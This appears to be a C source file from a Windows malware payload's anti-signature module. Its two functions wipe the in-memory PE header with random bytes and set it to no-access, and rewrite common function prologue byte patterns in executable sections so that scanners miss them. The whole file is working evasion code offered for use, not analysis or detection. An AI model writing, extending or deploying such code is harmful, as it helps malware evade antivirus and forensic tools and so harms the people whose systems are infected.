#include "payload.h"
#include <string.h>

BOOL antisig_wipe_header(PVOID base)
{
    if (!base) return FALSE;
    BYTE *b = (BYTE *)base;
    if (b[0] != 'M' || b[1] != 'Z') return FALSE;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)b;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
    DWORD hdrsz = nt->OptionalHeader.SizeOfHeaders;

    DWORD old;
    if (!VirtualProtect(b, hdrsz, PAGE_READWRITE, &old))
        return FALSE;

    DWORD tick = GetTickCount();
    for (DWORD i = 0; i < hdrsz; i++) {
        tick = tick * 1103515245 + 12345;
        b[i] = (BYTE)(tick >> 16);
    }

    VirtualProtect(b, hdrsz, PAGE_NOACCESS, &old);
    return TRUE;
}

BOOL antisig_morph_prologues(PVOID base)
{
    if (!base) return FALSE;
    BYTE *b = (BYTE *)base;
    if (b[0] != 'M' || b[1] != 'Z') return FALSE;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)b;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    int count = 0;

    for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++) {
        if (!(sec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        BYTE *code = b + sec[s].VirtualAddress;
        DWORD sz   = sec[s].Misc.VirtualSize;
        if (sz < 6) continue;

        DWORD old;
        if (!VirtualProtect(code, sz, PAGE_EXECUTE_READWRITE, &old))
            continue;

        for (DWORD i = 0; i + 5 < sz; i++) {
            if (code[i] == 0x55 && code[i+1] == 0x8B && code[i+2] == 0xEC) {
                code[i+1] = 0x89;
                code[i+2] = 0xE5;
                count++;
            }
            if (code[i] == 0x8B && code[i+1] == 0xFF) {
                code[i]   = 0x87;
                code[i+1] = 0xC0;
                count++;
            }
        }

        VirtualProtect(code, sz, old, &old);
    }

    log_write("AS", "morph %d prologues", count);
    return count > 0;
}
